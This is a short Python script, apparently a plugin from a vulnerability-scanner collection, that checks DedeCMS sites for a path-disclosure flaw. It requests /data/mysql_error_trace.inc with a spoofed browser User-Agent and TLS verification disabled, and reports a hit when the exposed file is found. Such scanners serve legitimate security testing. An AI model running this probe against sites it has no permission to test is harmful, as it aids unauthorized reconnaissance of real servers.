#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms trace爆路径漏洞
referer: http://0daysec.blog.51cto.com/9327043/1571372
author: Lucifer
description: 访问mysql_error_trace.inc,mysql trace报错路径泄露。
'''
import sys
import requests



class dedecms_error_trace_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/data/mysql_error_trace.inc"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<?php  exit()" in req.text:
                return "[+]存在dedecms trace爆路径漏洞...(信息)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = dedecms_error_trace_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()